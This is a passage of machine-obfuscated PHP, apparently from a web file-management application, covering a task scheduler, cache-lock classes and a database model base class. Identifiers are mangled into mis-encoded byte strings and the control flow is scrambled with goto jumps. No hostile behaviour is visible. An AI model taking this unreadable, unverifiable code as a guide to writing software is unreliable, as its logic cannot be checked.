$aú–¥ô•íÑ < $Aÿ‚Æ§¢ ≤; $aú–¥ô•íÑ++) { $fﬂ≥ö©ΩÉ± = $d∑íàΩªèé[$aú–¥ô•íÑ]; if (!$fﬂ≥ö©ΩÉ±[$D¨¡ËîÜ¡[394]] || $fﬂ≥ö©ΩÉ±[$D¨¡ËîÜ¡[1508]] != $D¨¡ËîÜ¡[87]) { continue; } if (!self::taskTimeCheck($fﬂ≥ö©ΩÉ±)) { continue; } self::taskRun($fﬂ≥ö©ΩÉ±); } Hook::trigger($D¨¡ËîÜ¡[1509]); goto BÜ–áº¬ÿª; EìÙ∂π«≠Ñ: $D¨¡ËîÜ¡ =& $_SERVER[Öíæ€“”≠éÏË]; $E≠˜ú€√ÎÃ = timeFloat(); $d∑íàΩªèé = Model($D¨¡ËîÜ¡[1507])->listData(); goto CÕ†»èãﬁô; FñÜÙ®˘¿ã: } private static function taskQueueRun($Añ¯†∏äàñ) { $F÷±„’©‚√ = 10; while (!0) { $D©Ñ±íÒÍÓ = TaskQueue::run(); if ($D©Ñ±íÒÍÓ === !1) { break; } if (timeFloat() - $Añ¯†∏äàñ >= $F÷±„’©‚√) { break; } } } private static function taskTimeCheck($b∑‚ÖÙ‰‹ø) { goto Eê¥∑≠∫çë; eùÌŸµõÆ: $AÂŸ¶éÔß– = strtotime($a…ÿœ±ì∏Ù[1510] . $Déªéπé„Á[$a…ÿœ±ì∏Ù[1511]] . $a…ÿœ±ì∏Ù[1512]) - strtotime($a…ÿœ±ì∏Ù[1513]); $a∏ü¯üﬁ´≠ = time() - strtotime(date($a…ÿœ±ì∏Ù[1514]) . $a…ÿœ±ì∏Ù[1515]); $AıÁ∂⁄Ö°∫ = $a∏ü¯üﬁ´≠ >= $AÂŸ¶éÔß– && $a∏ü¯üﬁ´≠ <= $AÂŸ¶éÔß– + 3600; goto fôÑüÚÌÃå; Eê¥∑≠∫çë: $a…ÿœ±ì∏Ù =& $_SERVER[Öíæ€“”≠éÏË]; $Déªéπé„Á = json_decode($b∑‚ÖÙ‰‹ø[$a…ÿœ±ì∏Ù[197]], !0); $D”Ì ÖÑòé = intval($b∑‚ÖÙ‰‹ø[$a…ÿœ±ì∏Ù[1502]]); goto eùÌŸµõÆ; fôÑüÚÌÃå: switch ($Déªéπé„Á[$a…ÿœ±ì∏Ù[29]]) { case $a…ÿœ±ì∏Ù[1516]: if (time() - $D”Ì ÖÑòé < 3600 * 24 * 30) { return !1; } if ($Déªéπé„Á[$a…ÿœ±ì∏Ù[1516]] == date($a…ÿœ±ì∏Ù[1517]) && $AıÁ∂⁄Ö°∫) { return !0; } break; case $a…ÿœ±ì∏Ù[1518]: if (time() - $D”Ì ÖÑòé < 3600 * 24 * 7) { return !1; } $DÎ¥®ÿ≈≤ü = date($a…ÿœ±ì∏Ù[1519]) == 0 ? 7 : date($a…ÿœ±ì∏Ù[1519]); if ($Déªéπé„Á[$a…ÿœ±ì∏Ù[1518]] == $DÎ¥®ÿ≈≤ü && $AıÁ∂⁄Ö°∫) { return !0; } break; case $a…ÿœ±ì∏Ù[1511]: if (time() - $D”Ì ÖÑòé < 3600 * 24) { return !1; } if ($AıÁ∂⁄Ö°∫) { return !0; } break; case $a…ÿœ±ì∏Ù[1520]: if (time() - $D”Ì ÖÑòé >= floatval($Déªéπé„Á[$a…ÿœ±ì∏Ù[1520]]) * 60) { return !0; } break; default: break; } return !1; goto aº±Î›≠ä¥; aº±Î›≠ä¥: } private static function closeDatabase() { goto F§éñ£ΩéÕ; a≤å¢·€û≥: $Eòﬁ»öœ•˘ = Model($cÚ´¿¨ óà[495])->db($cÚ´¿¨ óà[33]); if ($Eòﬁ»öœ•˘) { $Eòﬁ»öœ•˘->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($cÚ´¿¨ óà[1521], $cÚ´¿¨ óà[1522]); die; } goto A¶∏ÿïõ»µ; Dñ·∫–◊œÈ: if (!$aüØ‚ ‘ç¿) { $aüØ‚ ‘ç¿ = time(); } if (time() - $aüØ‚ ‘ç¿ < $eò›¿Õ¨œà) { return; } $aüØ‚ ‘ç¿ = time(); goto a≤å¢·€û≥; F§éñ£ΩéÕ: $cÚ´¿¨ óà =& $_SERVER[Öíæ€“”≠éÏË]; static $aüØ‚ ‘ç¿ = 0; $eò›¿Õ¨œà = 300; goto Dñ·∫–◊œÈ; A¶∏ÿïõ»µ: } public static function taskRun($D©∞‹ñ¬£ù) { goto b›πàüá‚; A°ÜÉòÜÇ”: return !0; goto eâ˜Óπ∑ÜÃ; b›πàüá‚: $DìΩ√∑÷∑Â =& $_SERVER[Öíæ€“”≠éÏË]; self::log($DìΩ√∑÷∑Â[1523] . $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[394]] . $DìΩ√∑÷∑Â[1524] . $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[28]] . $DìΩ√∑÷∑Â[1525] . $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[1526]]); Model($DìΩ√∑÷∑Â[1507])->run($D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[394]]); goto cœìˆπ´úó; B»¡ô„ﬂµç: Model($DìΩ√∑÷∑Â[1527])->add(array($DìΩ√∑÷∑Â[1528] => $DìΩ√∑÷∑Â[33], $DìΩ√∑÷∑Â[1529] => $DìΩ√∑÷∑Â[191], $DìΩ√∑÷∑Â[29] => $DìΩ√∑÷∑Â[1530] . $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[394]], $DìΩ√∑÷∑Â[1531] => json_encode(array($DìΩ√∑÷∑Â[28] => $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[28]], $DìΩ√∑÷∑Â[1532] => timeFloat() - $e‹íÍ˜É∆î, $DìΩ√∑÷∑Â[291] => $aö„Ñ§áÌØ)))); $BÙó⁄â∞Àà = $aö„Ñ§áÌØ ? $DìΩ√∑÷∑Â[1533] . $aö„Ñ§áÌØ : $DìΩ√∑÷∑Â[33]; self::log($DìΩ√∑÷∑Â[1534] . $D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[394]] . $DìΩ√∑÷∑Â[518] . $BÙó⁄â∞Àà); goto A°ÜÉòÜÇ”; cœìˆπ´úó: $e‹íÍ˜É∆î = timeFloat(); $aö„Ñ§áÌØ = $DìΩ√∑÷∑Â[33]; switch ($D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[29]]) { case $DìΩ√∑÷∑Â[305]: $dí¬ﬂíéâÁ = url_request($D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[1526]], $DìΩ√∑÷∑Â[228], !1, !1, !1, !1, 10); if ($dí¬ﬂíéâÁ[$DìΩ√∑÷∑Â[723]]) { $aö„Ñ§áÌØ = strlen($dí¬ﬂíéâÁ[$DìΩ√∑÷∑Â[1097]]); } break; case $DìΩ√∑÷∑Â[227]: $aö„Ñ§áÌØ = Hook::apply($D©∞‹ñ¬£ù[$DìΩ√∑÷∑Â[1526]]); default: break; } goto B»¡ô„ﬂµç; eâ˜Óπ∑ÜÃ: } private static function valueGet($B¥ç·ÿ„Ãï) { $eÈàóåµ˜Ù =& $_SERVER[Öíæ€“”≠éÏË]; $B«†º”€ƒ≥ = $eÈàóåµ˜Ù[1535]; $B¨à¿ıÃÇæ = Model($eÈàóåµ˜Ù[487])->get($B¥ç·ÿ„Ãï, $B«†º”€ƒ≥); if (is_null($B¨à¿ıÃÇæ)) { Model($eÈàóåµ˜Ù[487])->set($eÈàóåµ˜Ù[723], $eÈàóåµ˜Ù[87], $B«†º”€ƒ≥); Model($eÈàóåµ˜Ù[487])->set($eÈàóåµ˜Ù[1501], $eÈàóåµ˜Ù[191], $B«†º”€ƒ≥); $B¨à¿ıÃÇæ = Model($eÈàóåµ˜Ù[487])->get($B¥ç·ÿ„Ãï, $B«†º”€ƒ≥); } return $B¨à¿ıÃÇæ; } private static function valueSet($d√≈•ÈéÀû, $DÚ–Ã∂’€¨) { $dîô∫⁄»‹Õ =& $_SERVER[Öíæ€“”≠éÏË]; $A”øí∞∆¶Û = $dîô∫⁄»‹Õ[1536]; CacheLock::lock($A”øí∞∆¶Û); $CÉ•âù∑—Œ = Model($dîô∫⁄»‹Õ[487])->set($d√≈•ÈéÀû, $DÚ–Ã∂’€¨, $dîô∫⁄»‹Õ[1535]); CacheLock::unlock($A”øí∞∆¶Û); return $CÉ•âù∑—Œ; } protected static function log($eÆèÔã‹ÀÌ) { write_log($eÆèÔã‹ÀÌ, $_SERVER[Öíæ€“”≠éÏË][1522]); } private static function cacheClear() { $C°µä¬Ωëµ =& $_SERVER[Öíæ€“”≠éÏË]; Cache::clearMemory(Model($C°µä¬Ωëµ[487])->cacheKey($C°µä¬Ωëµ[1535])); Cache::clearMemory(Model($C°µä¬Ωëµ[487])->cacheKey($C°µä¬Ωëµ[1537])); Model($C°µä¬Ωëµ[1507])->cacheClear(); self::closeDatabase(); } } goto e›ò´»®óà; aäﬂéã¬…’: class CacheLockRedis { public function lock($CÎ”ÈÜﬁÁß, $f˘í¶¬ˆ‹À = 10) { $E≥◊éÊú∆â = Cache::init(); $bÜµÍ›€ä„ = microtime(!0) + $f˘í¶¬ˆ‹À; while (microtime(!0) < $bÜµÍ›€ä„) { $cŸû´Î∫∆˜ = $E≥◊éÊú∆â->get($CÎ”ÈÜﬁÁß); if (!$cŸû´Î∫∆˜) { $böÜŒ‹Ûº∑ = $E≥◊éÊú∆â->setLock($CÎ”ÈÜﬁÁß, $bÜµÍ›€ä„, $f˘í¶¬ˆ‹À); if ($böÜŒ‹Ûº∑) { return !0; } } else { if ($cŸû´Î∫∆˜ < microtime(!0)) { $E≥◊éÊú∆â->set($CÎ”ÈÜﬁÁß, $bÜµÍ›€ä„, $f˘í¶¬ˆ‹À * 2); if ($E≥◊éÊú∆â->get($CÎ”ÈÜﬁÁß) === $cŸû´Î∫∆˜) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($BØ≈ïµ¥¢∞) { return Cache::init()->get($BØ≈ïµ¥¢∞); } public function unlock($aÜ‡°úµ®Ã) { return Cache::init()->remove($aÜ‡°úµ®Ã); } } class CacheLockMemcached { public function lock($F°ªﬁÜÆπò, $dÃ‡ï§≈Éˆ = 0) { $BÕ¯˘Ã„Æá = Cache::init(); $BåΩ≤öΩ¶Û = microtime(!0) + $dÃ‡ï§≈Éˆ; while (microtime(!0) < $BåΩ≤öΩ¶Û) { $D÷äıéãú” = $BÕ¯˘Ã„Æá->get($F°ªﬁÜÆπò); if (!$D÷äıéãú” || $D÷äıéãú” < microtime(!0)) { $A∫êÖﬁä˜ì = $BÕ¯˘Ã„Æá->handle->add($F°ªﬁÜÆπò, $BåΩ≤öΩ¶Û, $dÃ‡ï§≈Éˆ); if ($A∫êÖﬁä˜ì) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D∑óø‹éä–) { return Cache::init()->get($D∑óø‹éä–); } public function unlock($Bå’ñÆéôˆ) { return Cache::init()->remove($Bå’ñÆéôˆ); } } class CacheLockDatabase { public function lock($aÂâüÇãÇí, $a∂ˆ÷üçÉÌ = 0) { $FÊƒ‚Ω£Ö∂ = Model($_SERVER[Öíæ€“”≠éÏË][807]); $Cµü¢Á¿Âë = microtime(!0) + $a∂ˆ÷üçÉÌ; while (microtime(!0) < $Cµü¢Á¿Âë) { $Cå¥ôÂÉ¡« = $FÊƒ‚Ω£Ö∂->get($aÂâüÇãÇí); if (!$Cå¥ôÂÉ¡« || $Cå¥ôÂÉ¡« < microtime(!0)) { $e÷æõ€Òã∫ = $FÊƒ‚Ω£Ö∂->set($aÂâüÇãÇí, $Cµü¢Á¿Âë); if ($e÷æõ€Òã∫) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C»ÍÛàÀ∆ó) { return Model($_SERVER[Öíæ€“”≠éÏË][807])->get($C»ÍÛàÀ∆ó); } public function unlock($dÚÖãÀßèÍ) { Model($_SERVER[Öíæ€“”≠éÏË][807])->remove($dÚÖãÀßèÍ); } } goto Dœ¥∏ë≥Èâ; eéµ√Ã§√ë: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\124\151\155\x65", "\x74\151\x6d\x65", "\151\156\x73\x65\162\x74\x2c\x75\160\144\141\164\x65", "\146\x75\156\x63\164\x69\x6f\x6e"), array("\x63\162\x65\141\x74\x65\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\165\156\x63\164\151\x6f\156")); public function setDataAuto($A÷‚ëØôÕÚ) { $this->dataAuto = $A÷‚ëØôÕÚ; } public function __construct($aÕÊÏúñË⁄ = '', $e¥°ÖÎ“°Ñ = '', $B›ú·’≤ë´ = '') { parent::__construct($aÕÊÏúñË⁄, $e¥°ÖÎ“°Ñ, $B›ú·’≤ë´); } protected $tableMeta = array(); protected function _beforeInsert(&$B‡ÖúÓªÔõ, $eáâ»ãÉÏ‚) { $bƒ‚Ô÷¥ôí =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->checkDataAutoHas($bƒ‚Ô÷¥ôí[353])) { return; } $this->dataBeforeFilter($B‡ÖúÓªÔõ, $bƒ‚Ô÷¥ôí[353]); } protected function _beforeUpdate(&$A†…Úê·≤â, $fê‘±¿ƒø¨) { $bÓç¥Ê√¿‘ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->checkDataAutoHas($bÓç¥Ê√¿‘[354])) { return; } $this->dataBeforeFilter($A†…Úê·≤â, $bÓç¥Ê√¿‘[354]); } protected function _afterSelect(&$B·é≈•Êœø, $dóÛèÈòè≥) { if (!is_array($B·é≈•Êœø)) { return; } if (!$this->checkDataAutoHas($_SERVER[Öíæ€“”≠éÏË][355])) { return; } foreach ($B·é≈•Êœø as &$b¯ﬁŸéÎÙ£) { $this->dataAfterFilter($b¯ﬁŸéÎÙ£); } unset($b¯ﬁŸéÎÙ£); } protected function _afterFind(&$f∫„îƒ¨¨Ç, $d†Áá∑ÉÁ¶) { if (!is_array($f∫„îƒ¨¨Ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[Öíæ€“”≠éÏË][355])) { return; } $this->dataAfterFilter($f∫„îƒ¨¨Ç); } public static function textEncode($F≈öã áñÍ) { if (!$F≈öã áñÍ) { return $F≈öã áñÍ; } $e∞⁄Ù¶Ìå© = json_encode($F≈öã áñÍ); $e∞⁄Ù¶Ìå© = preg_replace_callback($_SERVER[Öíæ€“”≠éÏË][356], function ($b’å’‰◊ê“) { return addslashes($b’å’‰◊ê“[0]); }, $e∞⁄Ù¶Ìå©); return json_decode($e∞⁄Ù¶Ìå©); } public static function textDecode($fßÚ⁄¢‡ñ») { $F åßá‹†Ù =& $_SERVER[Öíæ€“”≠éÏË]; $Bû¥∑¬ÓØ˘ = json_encode($fßÚ⁄¢‡ñ»); $Bû¥∑¬ÓØ˘ = preg_replace_callback($F åßá‹†Ù[357], function ($d•∑Ãé”ÍÀ) { return $_SERVER[Öíæ€“”≠éÏË][97]; }, $Bû¥∑¬ÓØ˘); return json_decode($Bû¥∑¬ÓØ˘); } public function setAutoIncrement($e∏ûÒë·Ü≠) { $A†´û°‰∆ç = array($this->getPk() => $e∏ûÒë·Ü≠); $A©íÏ€œ∆Á = $this->data($A†´û°‰∆ç)->add(); if ($A©íÏ€œ∆Á) { $this->delete($A©íÏ€œ∆Á); } } public function getAutoIncrement() { $Bò·ûµ§«Ü = $this->getTableName(); $D«ˆ…ƒ”•é = $this->max($this->getPk()); $AúõÚ¶≠‹• = $this->query("\x73\x68\157\x77\x20\164\141\142\154\145\40\x73\164\x61\164\165\163\40\x77\150\145\162\x65\40\116\141\155\x65\75\x27{$Bò·ûµ§«Ü}\x27"); $B›Ù∫ñ¨¬â = $AúõÚ¶≠‹•[0][$_SERVER[Öíæ€“”≠éÏË][358]]; $Bø«ã—ˆ•ç = max($D«ˆ…ƒ”•é, $B›Ù∫ñ¨¬â); return $Bø«ã—ˆ•ç; } protected function _callBefore($fÇ¶’‡≈∫∂, $DÍÃÒè–Ö¿) { return $this->cacheCallCheck($fÇ¶’‡≈∫∂, $DÍÃÒè–Ö¿, !1); } protected function _callAfter($dàçæ„‘Ù√, $D°πä”ì¡Ë) { return $this->cacheCallCheck($dàçæ„‘Ù√, $D°πä”ì¡Ë, !0); } protected function cacheFunctionAlias($aÖÿí¥Ú™®) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($bé≥Ñä¥≤Û, $e„É∆¢≈âŸ, $d¶Ë‰¡¬âü = false) { $c¥ÖΩØÇÔÊ = $this->cacheFunctionAlias($e„É∆¢≈âŸ); if (!$c¥ÖΩØÇÔÊ) { return; } foreach ($c¥ÖΩØÇÔÊ as $a∏√π´ë≠™ => $fäêºƒ™Œ‰) { $eó∑õôó®∆ = $fäêºƒ™Œ‰[0]; $EÚë≤‹∏ˆÕ = explode($_SERVER[Öíæ€“”≠éÏË][47], $fäêºƒ™Œ‰[1]); if ($bé≥Ñä¥≤Û == $a∏√π´ë≠™) { return $this->cacheFunctionGet($a∏√π´ë≠™, $eó∑õôó®∆); } if ($d¶Ë‰¡¬âü && in_array($bé≥Ñä¥≤Û, $EÚë≤‹∏ˆÕ)) { $this->cacheFunctionClear($a∏√π´ë≠™, $eó∑õôó®∆); } } } public function cacheFunctionGet($E„’´ßØ√˘, $dà™≥ıäÛ‰) { $EØêÃÛÖ≠ê = $this->cacheKeyMake($E„’´ßØ√˘, $dà™≥ıäÛ‰); $FÊ™ÿŒ†Û∏ = Cache::get($EØêÃÛÖ≠ê); if (!is_array($FÊ™ÿŒ†Û∏)) { $FÊ™ÿŒ†Û∏ = call_user_func_array(array($this, $E„’´ßØ√˘), array($dà™≥ıäÛ‰, !0)); Cache::set($EØêÃÛÖ≠ê, $FÊ™ÿŒ†Û∏); } return $FÊ™ÿŒ†Û∏; } public function cacheFunctionClear($CÃê∏çÔ©ê, $D≠ãÿ°œï€) { $Eéª∑∆¯ıé = $D≠ãÿ°œï€; if (!is_array($D≠ãÿ°œï€)) { $Eéª∑∆¯ıé = array($D≠ãÿ°œï€); } foreach ($Eéª∑∆¯ıé as $C°•∂Öﬂéé) { $FåÍØë∫äƒ = $this->cacheKeyMake($CÃê∏çÔ©ê, $C°•∂Öﬂéé); Cache::remove($FåÍØë∫äƒ); } } private function cacheKeyMake($D‡ˆÖ‚∆Üë, $cñÛ‰–®å›) { $bÜ˜ÉÆ¬Û∞ =& $_SERVER[Öíæ€“”≠éÏË]; return get_class($this) . $bÜ˜ÉÆ¬Û∞[71] . $D‡ˆÖ‚∆Üë . $bÜ˜ÉÆ¬Û∞[359] . $cñÛ‰–®å›; } protected function selectPageReset() { $fé«Á‹ª±“ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($GLOBALS[$fé«Á‹ª±“[360]])) { return; } $GLOBALS[$fé«Á‹ª±“[360]] = isset($GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[361]]) ? $GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[361]] : !1; $GLOBALS[$fé«Á‹ª±“[362]] = isset($GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[351]]) ? $GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[351]] : !1; $GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[361]] = !1; $GLOBALS[$fé«Á‹ª±“[7]][$fé«Á‹ª±“[351]] = !1; } protected function selectPageRestore() { $EÜêÏö§°Ü =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($GLOBALS[$EÜêÏö§°Ü[360]])) { return; } $GLOBALS[$EÜêÏö§°Ü[7]][$EÜêÏö§°Ü[361]] = $GLOBALS[$EÜêÏö§°Ü[360]]; $GLOBALS[$EÜêÏö§°Ü[7]][$EÜêÏö§°Ü[351]] = $GLOBALS[$EÜêÏö§°Ü[362]]; unset($GLOBALS[$EÜêÏö§°Ü[360]]); unset($GLOBALS[$EÜêÏö§°Ü[362]]); } protected function selectPage($bÜªôè’ç› = 200, $cßëÉ‘‘¯ä = 1) { goto F´û‘°ò†›; f∞ô‘…–‘ù: $Aõˆ÷ò¶úı = array(); $eπ™ÚèÃ∏É = 1; if ($cßëÉ‘‘¯ä == 1 && $eπ™ÚèÃ∏É) { $this->optionsValue($C⁄ŒŒÖ˜ßè); $Aõˆ÷ò¶úı = $this->page($cßëÉ‘‘¯ä, $bÜªôè’ç›)->select(); $a®àºø®òÍ = is_array($Aõˆ÷ò¶úı) ? count($Aõˆ÷ò¶úı) : 0; if ($a®àºø®òÍ < $bÜªôè’ç›) { $dì≠©ƒÔ∑£ = 1; } else { $this->optionsValue($C›ïÚÆÀ¯ﬁ); $a®àºø®òÍ = intval($this->count()); $dì≠©ƒÔ∑£ = ceil($a®àºø®òÍ / $bÜªôè’ç›); } } else { $this->optionsValue($C›ïÚÆÀ¯ﬁ); $a®àºø®òÍ = intval($this->count()); $dì≠©ƒÔ∑£ = ceil($a®àºø®òÍ / $bÜªôè’ç›); $cßëÉ‘‘¯ä = $cßëÉ‘‘¯ä >= $dì≠©ƒÔ∑£ ? $dì≠©ƒÔ∑£ : $cßëÉ‘‘¯ä; $this->optionsValue($C⁄ŒŒÖ˜ßè); $Aõˆ÷ò¶úı = $this->page($cßëÉ‘‘¯ä, $bÜªôè’ç›)->select(); } goto D¶≤ÍÿèπÙ; F´û‘°ò†›: $d ÁÙ‘ó‚Ω =& $_SERVER[Öíæ€“”≠éÏË]; global $in; $C⁄ŒŒÖ˜ßè = $this->optionsValue(); goto dºƒÁ¿¿≤©; D¶≤ÍÿèπÙ: if (!is_array($Aõˆ÷ò¶úı)) { $Aõˆ÷ò¶úı = array(); } if ($dì≠©ƒÔ∑£ == 1) { $a®àºø®òÍ = count($Aõˆ÷ò¶úı); } $d¢ÓËøùí€ = array($d ÁÙ‘ó‚Ω[364] => array($d ÁÙ‘ó‚Ω[365] => $a®àºø®òÍ, $d ÁÙ‘ó‚Ω[361] => $bÜªôè’ç›, $d ÁÙ‘ó‚Ω[351] => $cßëÉ‘‘¯ä, $d ÁÙ‘ó‚Ω[366] => $dì≠©ƒÔ∑£), $d ÁÙ‘ó‚Ω[367] => $Aõˆ÷ò¶úı); goto EäÜÕ¬õÓê; EäÜÕ¬õÓê: return $d¢ÓËøùí€; goto fêﬁûÉâ›≤; dºƒÁ¿¿≤©: $FïÈ∏‚ÏûÏ = 50000; $bÜªôè’ç› = isset($in[$d ÁÙ‘ó‚Ω[361]]) && $in[$d ÁÙ‘ó‚Ω[361]] ? $in[$d ÁÙ‘ó‚Ω[361]] : $bÜªôè’ç›; if ($bÜªôè’ç› === -1) { $in[$d ÁÙ‘ó‚Ω[361]] = !1; $FïÈ∏‚ÏûÏ = 100000000; $bÜªôè’ç› = $FïÈ∏‚ÏûÏ; } goto d´¿£“Œ’Í; D¿·∞∆¬—¬: $bÜªôè’ç› = $bÜªôè’ç› <= 5 ? 5 : ($bÜªôè’ç› >= $FïÈ∏‚ÏûÏ ? $FïÈ∏‚ÏûÏ : $bÜªôè’ç›); $cßëÉ‘‘¯ä = intval(isset($in[$d ÁÙ‘ó‚Ω[351]]) && $in[$d ÁÙ‘ó‚Ω[351]] ? $in[$d ÁÙ‘ó‚Ω[351]] : $cßëÉ‘‘¯ä); $cßëÉ‘‘¯ä = $cßëÉ‘‘¯ä <= 1 ? 1 : $cßëÉ‘‘¯ä; goto f∞ô‘…–‘ù; d´¿£“Œ’Í: $C›ïÚÆÀ¯ﬁ = $C⁄ŒŒÖ˜ßè; $C›ïÚÆÀ¯ﬁ[$d ÁÙ‘ó‚Ω[363]] = array(); $bÜªôè’ç› = intval($bÜªôè’ç›); goto D¿·∞∆¬—¬; fêﬁûÉâ›≤: } protected function checkLength($dùõÃ≥›ÿá, $cóªãÑïéé = 0, $d≠„–É≤¡≠ = '') { $b ®‚∂¢÷™ =& $_SERVER[Öíæ€“”≠éÏË]; $cóªãÑïéé = $cóªãÑïéé ? $cóªãÑïéé : 65536; if (!$dùõÃ≥›ÿá || strlen($dùõÃ≥›ÿá) < $cóªãÑïéé) { return; } $d≠„–É≤¡≠ = $d≠„–É≤¡≠ ? $d≠„–É≤¡≠ . $b ®‚∂¢÷™[68] : $b ®‚∂¢÷™[33]; show_json($d≠„–É≤¡≠ . LNG($b ®‚∂¢÷™[368]) . "\x28{$cóªãÑïéé}\51", !1); } protected function metaSet($AÔå±Œ≠Ã, $dê®˜ñ‹‚™ = null, $B‹€ÂÀèèŒ = null) { goto föØí¥÷û´; aÈ–¯≈èõº: $Bµ…©¥∏Ôò = $D≥É†âƒ™[373] . $this->tableMeta; CacheLock::lock($Bµ…©¥∏Ôò); $B‚πŸ¡èÌ·->where(array($Fëè£⁄‰≈ã => $AÔå±Œ≠Ã))->addAll($b¢¡œéïà‰, array(), !0); goto e∆öä»åÃÉ; eÀﬂí≥ßı›: $FÁ‡Ç‚«∆Ÿ = $this->tableMeta[$D≥É†âƒ™[370]]; $B‚πŸ¡èÌ· = Model($FÁ‡Ç‚«∆Ÿ); $B∏ÇÃòíÇ¿ = array($Fëè£⁄‰≈ã => $AÔå±Œ≠Ã, $D≥É†âƒ™[371] => $dê®˜ñ‹‚™); goto c†øÑ¨÷ ¡; e∆öä»åÃÉ: CacheLock::unlock($Bµ…©¥∏Ôò); return !0; goto aûÃ™Ó¨è…; F”™‡Ë≠à¿: if (is_string($dê®˜ñ‹‚™)) { $bãØÜ÷íí[$dê®˜ñ‹‚™] = $B‹€ÂÀèèŒ; } $b¢¡œéïà‰ = array(); foreach ($bãØÜ÷íí as $cà’¿°æçá => $fÙ⁄à‰¯“ô) { $this->checkLength($fÙ⁄à‰¯“ô, !1, $FÁ‡Ç‚«∆Ÿ . $D≥É†âƒ™[4] . $cà’¿°æçá); $b¢¡œéïà‰[] = array($Fëè£⁄‰≈ã => $AÔå±Œ≠Ã, $D≥É†âƒ™[93] => $cà’¿°æçá, $D≥É†âƒ™[372] => $fÙ⁄à‰¯“ô); } goto aÈ–¯≈èõº; c†øÑ¨÷ ¡: if (is_null($dê®˜ñ‹‚™)) { return $B‚πŸ¡èÌ·->where(array($Fëè£⁄‰≈ã => $AÔå±Œ≠Ã))->delete(); } if (is_null($B‹€ÂÀèèŒ) && is_string($dê®˜ñ‹‚™)) { return $B‚πŸ¡èÌ·->where($B∏ÇÃòíÇ¿)->delete(); } $bãØÜ÷íí = is_array($dê®˜ñ‹‚™) ? $dê®˜ñ‹‚™ : array(); goto F”™‡Ë≠à¿; föØí¥÷û´: $D≥É†âƒ™ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->tableMeta || !$AÔå±Œ≠Ã) { return !1; } $Fëè£⁄‰≈ã = $this->tableMeta[$D≥É†âƒ™[369]]; goto eÀﬂí≥ßı›; aûÃ™Ó¨è…: } public function metaGet($Dãè‡úç√É, $aÕà¬£â…© = false) { goto DÈ–ﬁ’–ÿﬂ; DÈ–ﬁ’–ÿﬂ: $Dà©Ìœ¶—‹ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->tableMeta) { return array(); } $DëËÂâÒ€ß = $this->tableMeta[$Dà©Ìœ¶—‹[369]]; goto c” ´ËÙÖÎ; c” ´ËÙÖÎ: $FÑó≥¿“ú≥ = Model($this->tableMeta[$Dà©Ìœ¶—‹[370]]); if ($aÕà¬£â…©) { $dè”˘–”úü = array($DëËÂâÒ€ß => $Dãè‡úç√É, $Dà©Ìœ¶—‹[93] => $aÕà¬£â…©); return $FÑó≥¿“ú≥->where($dè”˘–”úü)->getField($Dà©Ìœ¶—‹[372]); } $dè”˘–”úü = array($DëËÂâÒ€ß => $Dãè‡úç√É); goto b‰ã≈∫Ω∞ó; b‰ã≈∫Ω∞ó: $cç≈€®úü√ = $FÑó≥¿“ú≥->field($Dà©Ìœ¶—‹[374])->where($dè”˘–”úü)->select(); $cç≈€®úü√ = array_to_keyvalue($cç≈€®úü√, $Dà©Ìœ¶—‹[93], $Dà©Ìœ¶—‹[372]); return $cç≈€®úü√; goto eê£«‡Ùâ≠; eê£«‡Ùâ≠: } private function checkDataAutoHas($DâŸê§ÉæÑ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $få˘˘¿≈Ñ«) { if (in_array($DâŸê§ÉæÑ, explode($_SERVER[Öíæ€“”≠éÏË][47], $få˘˘¿≈Ñ«[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$d›≈–ã’–§, $d∆ £ﬂÊ„¬) { $B˘ØÇÜÑÆÀ =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($this->dataAuto as $E—Ç´¢ä©€) { $fÓäÈ∞éÚ¯ = $E—Ç´¢ä©€[0]; if (!in_array($d∆ £ﬂÊ„¬, explode($B˘ØÇÜÑÆÀ[47], $E—Ç´¢ä©€[2]))) { continue; } switch (trim($E—Ç´¢ä©€[3])) { case $B˘ØÇÜÑÆÀ[319]: case $B˘ØÇÜÑÆÀ[320]: $Få„óî¿ˆﬂ = $E—Ç´¢ä©€[1]; $B±™≈ÜÖµ‡ = isset($E—Ç´¢ä©€[4]) ? (array) $E—Ç´¢ä©€[4] : array(); if ($Få„óî¿ˆﬂ == $B˘ØÇÜÑÆÀ[197] && array_key_exists($fÓäÈ∞éÚ¯, $d›≈–ã’–§)) { if (!$d›≈–ã’–§[$fÓäÈ∞éÚ¯]) { unset($d›≈–ã’–§[$fÓäÈ∞éÚ¯]); } break; } if (isset($d›≈–ã’–§[$fÓäÈ∞éÚ¯])) { array_unshift($B±™≈ÜÖµ‡, $d›≈–ã’–§[$fÓäÈ∞éÚ¯]); } if ($B˘ØÇÜÑÆÀ[319] == $E—Ç´¢ä©€[3]) { 